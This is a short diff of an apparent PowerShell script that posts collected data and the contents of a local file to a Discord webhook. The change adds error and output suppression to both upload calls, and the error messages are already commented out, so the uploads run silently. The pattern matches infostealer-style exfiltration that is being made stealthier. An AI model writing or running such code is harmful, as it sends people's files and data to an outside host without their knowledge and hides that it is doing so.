@@ -36,7 +36,7 @@ try {
 
         # Send the data to the Discord webhook
         try {
-            Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+            Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
         } catch {
             #Write-Host "Failed to send data to Discord webhook"
         }
@@ -176,7 +176,7 @@ if (Test-Path $filePath) {
 
         # Try to send the content to the Discord webhook
         try {
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
             Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
         } catch {
             #Write-Host "Error sending request: $_"
